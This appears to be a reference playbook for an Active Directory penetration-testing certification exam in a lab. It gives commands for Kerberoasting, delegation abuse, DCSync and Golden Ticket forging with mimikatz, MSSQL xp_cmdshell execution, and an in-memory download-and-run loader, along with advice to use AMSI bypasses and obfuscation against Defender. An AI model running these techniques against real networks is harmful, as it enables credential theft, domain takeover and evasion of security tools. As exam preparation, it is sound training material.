# CRTP Playbook & Reference (for authorized exam/lab use)

This is the technique reference behind the analyzer. The analyzer tells you WHAT
is attackable from the collected AD data; this file is the HOW and the gaps.

> Report rule: every "why it works" note here is for YOUR understanding. In the
> exam report you must re-explain it in YOUR OWN words. Do not paste from here.

---

## 0. Operational constraints (this exam)
- **Only TCP 4444 / 8888 open** (in + out). Set reverse shells / downloads /
  Rubeus relay etc. to those ports. HTTP staging server -> `:8888`, shell -> `:4444`.
- **No tools on exam VM** — upload only what you need via RDP copy-paste. Minimal
  kit: PowerView, AD module (Microsoft-signed), Rubeus, Mimikatz/SafetyKatz,
  PowerUpSQL, Invoke-MimikatzEx, PsExec/winrs, SharpHound/SOAPHound collector.
- **AMSI / Defender** likely on. Keep AMSI bypass + obfuscated loaders ready;
  prefer in-memory (`IEX (New-Object Net.WebClient).DownloadString(...)`).
- **studvm** is yours (not a target). 5 targets across multiple domains.
- Final flag: `C:\Users\finadmin\Desktop\finalflag.txt` on the DC.

---

## 1. Enumeration first (feeds the analyzer)
Collect with SOAPHound (stealthier, ADWS/SOAP) then load JSON here.
```
# SOAPHound collection (authorized lab)
SOAPHound.exe --buildcache -c c:\temp\cache.txt
SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bh
# then: python parser\main.py c:\temp\bh
```
Manual PowerView sanity checks:
```
Get-Domain; Get-DomainController; Get-DomainTrustMapping
Get-DomainUser -SPN | select samaccountname
Get-DomainUser -PreauthNotRequired
Get-DomainComputer -Unconstrained
Get-DomainUser -TrustedToAuth
Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -match 'student|<youruser>'}
```

## 2. Techniques the analyzer flags (data-driven)
| Finding | Primitive | Key tool |
|---------|-----------|----------|
| Kerberoasting | SPN set -> crack svc pw | Rubeus kerberoast, hashcat -m 13100 |
| AS-REP roast | no preauth -> crack | Rubeus asreproast, hashcat -m 18200 |
| Unconstrained deleg | capture TGT after coercion | Rubeus monitor/tgtdeleg + PetitPotam |
| Constrained deleg | S4U2Proxy to listed SPN | Rubeus s4u |
| RBCD | set/abuse AllowedToAct | Rubeus s4u + PowerView Set-DomainObject |
| ACL abuse | GenericAll/WriteDacl/etc | PowerView, Whisker (shadow creds) |
| DCSync rights | dump krbtgt/admin hashes | mimikatz lsadump::dcsync |
| Trusts | child->parent SID history | mimikatz golden /sids: |
| Creds in description | plaintext login | direct auth test |

## 3. Persistence / escalation chain (typical CRTP flow)
1. Initial foothold on studvm-reachable host (app / cred / roast).
2. Local privesc on that host (see Gaps) -> OS command exec = **target done #1**.
3. Lateral move with harvested creds/hashes (OverPass-the-Hash, winrs, PSRemoting).
4. Domain privesc: delegation / ACL chain -> DA.
5. DCSync krbtgt -> Golden Ticket -> cross-domain via SID history -> parent DA / EA.
6. Reach DC, read `finalflag.txt`.

Lateral / OPTH quick ref:
```
Rubeus.exe asktgt /user:<u> /rc4:<ntlm> /ptt
winrs -r:<host> cmd
Invoke-Command -ComputerName <host> -ScriptBlock {hostname; whoami}
```
Golden + SID history (child->parent):
```
mimikatz: kerberos::golden /user:Administrator /domain:<child> /sid:<child_sid> \
  /krbtgt:<child_krbtgt_hash> /sids:<parent_root_sid>-519 /ptt
```

---

## 4. GAPS — what SOAPHound/BloodHound data does NOT show
The analyzer is blind to these. Enumerate manually on each host; they are often
the ACTUAL initial-access / privesc path in CRTP:

- **MSSQL linked servers** (very common CRTP path):
  ```
  Get-SQLInstanceDomain | Get-SQLConnectionTest
  Get-SQLServerLinkCrawl -Instance <inst>      # crawl link chain
  # xp_cmdshell on a link that runs as sysadmin -> OS command exec
  ```
- **Local privilege escalation** (PowerUp / winPEAS): unquoted paths, service
  perms, AlwaysInstallElevated, token privs (SeImpersonate -> PrintSpoofer/GodPotato).
  -> Partially automated: `parser/localpriv.py`.
     `python localpriv.py --enum` prints what to run on the host; then
     `python localpriv.py --priv priv.txt --groups groups.txt --powerup pu.txt`
     parses the output and ranks escalation vectors (SeImpersonate highest).
- **Web / application** footholds on each target (default creds, upload, RCE).
- **Credential material on disk / memory**: `Invoke-Mimikatz sekurlsa::logonpasswords`,
  DPAPI, saved creds, GPP cpassword in SYSVOL.
- **ADCS (ESC1-15)** if a CA is present — not in standard BloodHound node data.
- **LAPS / gMSA** readable passwords (analyzer flags the ACE; you still fetch them).

For depth on any of these, use the `ad-internal-pentest` skill's technique index.

---

## 5. Report quality (scored heavily — write it YOURSELF)
Per exam rules, high-scoring reports:
- Explain WHY each command/tool worked (attacker perspective, in your words).
- Include practical mitigations per finding.
- Cite sources: tool repos, talks, blog posts.
- Every target server: approach + tools + output + screenshots.
- Final flag screenshot with hostname + whoami visible.
Use `output/evidence_tracker.md` to organize evidence as you go — then write prose
yourself. If English isn't your first language, state that in the report.

## 6. References to cite (examples — verify/expand yourself)
- PowerSploit/PowerView, GhostPack/Rubeus, gentilkiwi/mimikatz, NetSPI/PowerUpSQL,
  Whisker (shadow creds), SOAPHound, BloodHound docs, HarmJ0y blog (delegation),
  Altered Security course material. Add the specific pages you actually used.
